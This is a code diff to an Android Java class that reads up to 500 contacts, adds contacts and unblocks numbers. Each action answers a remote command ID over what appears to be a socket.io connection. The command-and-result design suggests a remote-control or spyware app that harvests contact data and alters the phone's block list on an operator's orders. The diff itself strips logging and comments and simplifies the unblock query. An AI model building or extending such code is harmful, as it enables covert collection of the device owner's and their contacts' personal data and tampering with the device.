@@ -11,7 +11,6 @@ import android.provider.BlockedNumberContract;
 import android.provider.ContactsContract;
 import android.provider.ContactsContract.CommonDataKinds.Phone;
 import android.provider.ContactsContract.RawContacts;
-import android.util.Log;
 import com.fason.app.core.FasonApp;
 import com.fason.app.core.Protocol;
 import com.fason.app.core.network.SocketClient;
@@ -22,7 +21,6 @@ import java.util.ArrayList;
 import io.socket.client.Socket;
 
 public final class ContactsManager {
-    private static final String TAG = "ContactsManager";
     private static final int MAX = 500;
 
     private ContactsManager() {}
@@ -38,7 +36,6 @@ public final class ContactsManager {
                 result.put(Protocol.KEY_ERROR, "Permission denied");
                 return result;
             }
-            // v4.0: also pull contact_id and raw_contact_id for delete/edit
             Cursor cur = FasonApp.getContext().getContentResolver().query(
                 Phone.CONTENT_URI,
                 new String[]{
@@ -59,13 +56,14 @@ public final class ContactsManager {
                     int typeIdx = cur.getColumnIndex(Phone.TYPE);
                     int count = 0;
                     while (cur.moveToNext() && count < MAX) {
-                        String name   = nameIdx >= 0 ? cur.getString(nameIdx) : "";
-                        String phoneNo = numIdx >= 0 ? cur.getString(numIdx) : "";
+                        String name    = nameIdx >= 0 ? cur.getString(nameIdx) : "";
+                        String phoneNo = numIdx  >= 0 ? cur.getString(numIdx)  : "";
                         if (name == null) name = "";
                         if (phoneNo == null) phoneNo = "";
                         if (name.isEmpty() && phoneNo.isEmpty()) continue;
                         JSONObject c = new JSONObject();
                         c.put(Protocol.KEY_CONTACT_ID, idIdx >= 0 ? cur.getLong(idIdx) : -1);
+                        if (rawIdx >= 0) c.put(Protocol.KEY_RAW_CONTACT_ID, cur.getLong(rawIdx));
                         c.put(Protocol.KEY_NAME, name);
                         c.put(Protocol.KEY_PHONE_NO, phoneNo);
                         if (typeIdx >= 0) c.put(Protocol.KEY_PHONE_TYPE, cur.getInt(typeIdx));
@@ -116,19 +114,16 @@ public final class ContactsManager {
             if (name == null) name = "";
             if (phone == null) phone = "";
             ArrayList<ContentProviderOperation> ops = new ArrayList<>();
-            // Insert raw contact
             ops.add(ContentProviderOperation.newInsert(RawContacts.CONTENT_URI)
                 .withValue(RawContacts.ACCOUNT_TYPE, null)
                 .withValue(RawContacts.ACCOUNT_NAME, null)
                 .build());
-            // Set display name
             ops.add(ContentProviderOperation.newInsert(ContactsContract.Data.CONTENT_URI)
                 .withValueBackReference(ContactsContract.Data.RAW_CONTACT_ID, 0)
                 .withValue(ContactsContract.Data.MIMETYPE,
                     ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE)
                 .withValue(ContactsContract.CommonDataKinds.StructuredName.DISPLAY_NAME, name)
                 .build());
-            // Set phone number
             if (!phone.isEmpty()) {
                 ops.add(ContentProviderOperation.newInsert(ContactsContract.Data.CONTENT_URI)
                     .withValueBackReference(ContactsContract.Data.RAW_CONTACT_ID, 0)
@@ -174,21 +169,11 @@ public final class ContactsManager {
             return;
         }
         try {
-            Uri lookup = Uri.withAppendedPath(BlockedNumberContract.BlockedNumbers.CONTENT_FILTER_URI, Uri.encode(number));
-            int rows = 0;
-            android.database.Cursor c = FasonApp.getContext().getContentResolver().query(
-                    lookup, new String[]{BlockedNumberContract.BlockedNumbers.COLUMN_ID}, null, null, null);
-            if (c != null) {
-                try {
-                    while (c.moveToNext()) {
-                        long id = c.getLong(0);
-                        Uri row = ContentUris.withAppendedId(BlockedNumberContract.BlockedNumbers.CONTENT_URI, id);
-                        rows += FasonApp.getContext().getContentResolver().delete(row, null, null);
-                    }
-                } finally {
-                    c.close();
-                }
-            }
+            int rows = FasonApp.getContext().getContentResolver().delete(
+                BlockedNumberContract.BlockedNumbers.CONTENT_URI,
+                BlockedNumberContract.BlockedNumbers.COLUMN_ORIGINAL_NUMBER + " = ?",
+                new String[]{number}
+            );
             sendResult("unblock_number", rows > 0, rows > 0 ? null : "Number not blocked", cmdId);
         } catch (Exception e) {
             sendResult("unblock_number", false, e.getMessage(), cmdId);
